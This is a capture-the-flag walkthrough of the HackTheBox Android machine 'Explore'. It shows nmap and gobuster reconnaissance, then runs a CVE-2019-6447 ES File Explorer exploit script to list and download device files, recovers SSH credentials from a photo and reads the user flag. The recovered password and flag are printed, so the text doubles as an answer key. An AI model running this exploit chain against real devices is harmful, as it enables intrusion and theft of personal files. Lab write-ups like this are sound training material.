# [Explore]()
Android, 20 Points, Easy

ip = 10.10.10.247

#### nmap scan
```
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
4501/tcp  closed   unknown
5555/tcp  filtered freeciv
7135/tcp  closed   unknown
8705/tcp  closed   unknown
17330/tcp closed   unknown
17338/tcp closed   unknown
20873/tcp closed   unknown
25959/tcp closed   unknown
32381/tcp closed   unknown
33431/tcp closed   unknown
36745/tcp open     unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:28:38 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest:
|     HTTP/1.1 412 Precondition Failed
|     Date: Fri, 30 Jul 2021 04:28:38 GMT
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.0 501 Not Implemented
|     Date: Fri, 30 Jul 2021 04:28:44 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:02 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:28:44 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:02 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:03 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ??random1random2random3random4
|   TerminalServerCookie:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:03 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|_    Cookie: mstshash=nmap
37712/tcp closed   unknown
38224/tcp closed   unknown
40415/tcp closed   unknown
42844/tcp closed   unknown
49627/tcp closed   unknown
51958/tcp closed   unknown
52854/tcp closed   unknown
55744/tcp closed   unknown
56823/tcp closed   unknown
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
60540/tcp closed   unknown
60600/tcp closed   unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port36745-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
SF:30\x20Jul\x202021\x2004:28:38\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:2
SF:8:38\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x
SF:2004:28:44\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:28:44\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Fri,\x2030\x20Jul\x202021\x2004:29:02\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2030\x20Jul\x
SF:202021\x2004:29:02\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x203
SF:0\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Fri,\x2030\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
```
## User
There is a http server running on port `57999`. Opening the page `http://10.10.10.247:59777/` on browser
gives the output
```
FORBIDDEN: No directory listing.
```
Using gobuster I tried to find other directories.`gobuster -u http://10.10.10.247:59777 -w /usr/share/wordlists/dirb/big.txt dir`, output:
```
/acct                 (Status: 301) [Size: 65] [--> /acct/]
/bin                  (Status: 301) [Size: 63] [--> /bin/]
/cache                (Status: 301) [Size: 67] [--> /cache/]
/config               (Status: 301) [Size: 69] [--> /config/]
/d                    (Status: 301) [Size: 59] [--> /d/]
/data                 (Status: 301) [Size: 65] [--> /data/]
/dev                  (Status: 301) [Size: 63] [--> /dev/]
/etc                  (Status: 301) [Size: 63] [--> /etc/]
/init                 (Status: 403) [Size: 31]
/lib                  (Status: 301) [Size: 63] [--> /lib/]
/mnt                  (Status: 301) [Size: 63] [--> /mnt/]
/oem                  (Status: 301) [Size: 63] [--> /oem/]
/proc                 (Status: 301) [Size: 65] [--> /proc/]
/product              (Status: 301) [Size: 71] [--> /product/]
/sbin                 (Status: 301) [Size: 65] [--> /sbin/]
/storage              (Status: 301) [Size: 71] [--> /storage/]
/sys                  (Status: 301) [Size: 63] [--> /sys/]
/system               (Status: 301) [Size: 69] [--> /system/]
/vendor               (Status: 301) [Size: 69] [--> /vendor/]
```
In all directories listing is forbidden. I tried to get any credentials. But `/etc/ssh` and  `/etc/passwd` are not available. For `/init` the reading of the file was forbidden. `/etc/hosts` was available and while going to that file `http://10.10.10.247:59777/etc/hosts`, it was getting downloaded.

So there are files in the machine and some which are readible to us. We have to **explore files** in the machine. Searching for "explore file android exploits".

The first result is CVE-2019-6447. It will list all the files in android server and can get it. The port in the exploit is set to `59777`. Lets see exploits help
```console
┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 help
USAGE 50070 <command> <IP> [file to download]

┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 help 10.10.10.247                                                                            1 ⨯
[-] WRONG COMMAND!
Available commands :
  listFiles         : List all Files.
  listPics          : List all Pictures.
  listVideos        : List all videos.
  listAudios        : List all audios.
  listApps          : List Applications installed.
  listAppsSystem    : List System apps.
  listAppsPhone     : List Communication related apps.
  listAppsSdcard    : List apps on the SDCard.
  listAppsAll       : List all Application.
  getFile           : Download a file.
  getDeviceInfo     : Get device info.
```
I used all the commands available and see if I get anything useful.
Using `listPics` I get a image of credentials.
```console
┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 listPics 10.10.10.247                                                                        1 ⨯

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)


┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
```
The image contains:
```
kristi
Kr1sT!5h@Rp3xPl0r3!
```
This is the credentials for ssh. Connecting through ssh
```console
ssh kristi@10.10.10.247 -p 2222          
The authenticity of host '[10.10.10.247]:2222 ([10.10.10.247]:2222)' can't be established.
RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.247]:2222' (RSA) to the list of known hosts.
Password authentication
Password:
:/ $ ls
acct                   init.superuser.rc       sbin
bin                    init.usb.configfs.rc    sdcard
bugreports             init.usb.rc             sepolicy
cache                  init.zygote32.rc        storage
charger                init.zygote64_32.rc     sys
config                 lib                     system
d                      mnt                     ueventd.android_x86_64.rc
data                   odm                     ueventd.rc
default.prop           oem                     vendor
dev                    plat_file_contexts      vendor_file_contexts
etc                    plat_hwservice_contexts vendor_hwservice_contexts
fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
init                   plat_seapp_contexts     vendor_seapp_contexts
init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
init.environ.rc        proc                    vndservice_contexts
init.rc                product
:/ $ whoami
u0_a76
:/ $ cd s
sbin/     sdcard/   sepolicy  storage/  sys/      system/
:/ $ cd sdcard/
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
Android Download Music  Pictures      Ringtones dianxinos
:/sdcard $ ca
cal             cameraserver    case            cat             catv
:/sdcard $ cat user.txt
f32017174c7c7e8f50c6da52891ae250
```
